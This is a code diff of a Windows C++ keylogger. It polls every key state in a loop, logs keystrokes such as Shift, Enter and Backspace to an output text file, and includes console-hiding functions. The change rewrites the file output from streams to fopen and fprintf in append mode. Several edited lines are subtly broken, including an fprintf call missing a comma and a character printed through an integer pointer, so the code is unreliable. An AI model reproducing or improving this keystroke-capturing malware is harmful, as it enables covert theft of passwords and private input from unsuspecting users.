@@ -1,5 +1,6 @@
 #define PATH "..\\KeyLogger_OUTFILE.txt"  // path to output folder location
 #include <iostream>
+#include <cstdio>
 #include <Windows.h>
 #include <time.h>
 #include <fstream>
@@ -12,7 +13,7 @@ int main()
 	showConsole();
 	while (true)
 	{
-		Sleep(20); 
+		Sleep(20);
 		for (char i = 8; i <= 255; i++)
 			if (GetAsyncKeyState(i) == -32767) // catch keystrokes
 				saveToFile(i);
@@ -22,33 +23,33 @@ int main()
 void saveToFile(int key_ascii)
 {
 	Sleep(20);
-	std::ofstream OUTPUT_FILE;
-	OUTPUT_FILE.open(PATH);
-	if (OUTPUT_FILE.fail())
+	FILE* OUTPUT_FILE;
+	OUTPUT_FILE = fopen(PATH, "a+");
+	if (OUTPUT_FILE == NULL)
 	{
 		showConsole();
 		std::cout << "Error: cannot open file " << PATH;
 	}
-		
+
 	else if (key_ascii == VK_ESCAPE)
 		exit(1);
 	else if (key_ascii == VK_SHIFT)
-		OUTPUT_FILE << "[SHIFT]";
+		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
 	else if (key_ascii == VK_RETURN)
-		OUTPUT_FILE << "[ENTER]";
+		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
 	else if (key_ascii == VK_SPACE)
-		OUTPUT_FILE << "[SPACE]";
+		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
 	else if (key_ascii == VK_TAB)
-		OUTPUT_FILE << "[TAB]";
+		fprintf(OUTPUT_FILE, "%s", "[TAB]");
 	else if (key_ascii == VK_DELETE)
-		OUTPUT_FILE << "[DELETE]";
+		fprintf(OUTPUT_FILE, "%s" "[DELETE]");
 	else if (key_ascii == VK_BACK)
-		OUTPUT_FILE << "[BACKSPACE]";
+		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
 	else if (key_ascii == VK_SHIFT)
-		OUTPUT_FILE << "[SHIFT]";
+		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
 	else
-		OUTPUT_FILE << (char)&key_ascii;
-	OUTPUT_FILE.close();
+		fprintf(OUTPUT_FILE, "%s", &key_ascii);
+	fclose(OUTPUT_FILE);
 }
 
 void hideConsole()
